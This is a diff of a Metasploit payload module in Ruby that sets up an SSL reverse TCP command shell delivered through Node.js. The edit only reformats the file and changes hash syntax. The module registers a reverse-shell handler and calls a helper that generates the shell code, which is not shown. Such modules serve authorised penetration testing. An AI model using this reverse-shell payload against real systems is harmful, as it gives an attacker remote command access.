@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -10,7 +11,6 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-
   CachedSize = 516
 
   include Msf::Payload::Single
@@ -19,17 +19,16 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Command Shell, Reverse TCP SSL (via nodejs)',
-      'Description'   => 'Creates an interactive shell via nodejs, uses SSL',
-      'Author'        => ['RageLtMan', 'joev'],
-      'License'       => BSD_LICENSE,
-      'Platform'      => 'nodejs',
-      'Arch'          => ARCH_NODEJS,
-      'Handler'       => Msf::Handler::ReverseTcpSsl,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'nodejs',
-      'Payload'       => { 'Offsets' => {}, 'Payload' => '' }
-    ))
+                     'Name'          => 'Command Shell, Reverse TCP SSL (via nodejs)',
+                     'Description'   => 'Creates an interactive shell via nodejs, uses SSL',
+                     'Author'        => ['RageLtMan', 'joev'],
+                     'License'       => BSD_LICENSE,
+                     'Platform'      => 'nodejs',
+                     'Arch'          => ARCH_NODEJS,
+                     'Handler'       => Msf::Handler::ReverseTcpSsl,
+                     'Session'       => Msf::Sessions::CommandShell,
+                     'PayloadType'   => 'nodejs',
+                     'Payload'       => { 'Offsets' => {}, 'Payload' => '' }))
   end
 
   #
@@ -43,6 +42,6 @@ module MetasploitModule
   # Returns the JS string to use for execution
   #
   def command_string
-    nodejs_reverse_tcp(:use_ssl => true)
+    nodejs_reverse_tcp(use_ssl: true)
   end
 end
